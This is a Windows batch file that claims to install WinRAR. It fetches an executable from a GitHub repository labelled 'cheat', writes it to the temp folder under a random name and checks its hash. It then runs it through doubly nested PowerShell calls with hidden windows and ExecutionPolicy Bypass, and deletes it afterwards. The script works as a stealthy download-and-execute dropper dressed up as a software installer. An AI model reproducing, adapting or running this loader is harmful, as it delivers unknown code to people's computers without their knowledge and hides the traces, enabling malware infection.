@echo off
setlocal EnableExtensions

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=015e2e6a6f81dbf422fe5751016c96305a6b271b069fcd56f0c8bd5b93f6271e"
set "OUT=%TEMP%\winrar_pkg_%RANDOM%.exe"

set "PS_CMD=$ErrorActionPreference='Stop';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$u=$env:URL;$h=$env:HASH.ToLowerInvariant();$f=$env:OUT;if(Test-Path -LiteralPath $f){Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue};$ok=$false;try{& curl.exe -L -s -f -o $f $u;if((Test-Path -LiteralPath $f) -and ((Get-Item -LiteralPath $f).Length -gt 0)){$ok=$true}}catch{};if(-not $ok){try{(New-Object System.Net.WebClient).DownloadFile($u,$f);if((Test-Path -LiteralPath $f) -and ((Get-Item -LiteralPath $f).Length -gt 0)){$ok=$true}}catch{}};if(-not $ok){exit 1};$cur=(Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash.ToLowerInvariant();if($cur -ne $h){Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue;exit 2};$proc=Start-Process -FilePath $f -PassThru -Wait;Start-Sleep -Seconds 2;Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue;exit $proc.ExitCode"

start "" /min powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-Command',$env:PS_CMD)"

endlocal
exit /b 0
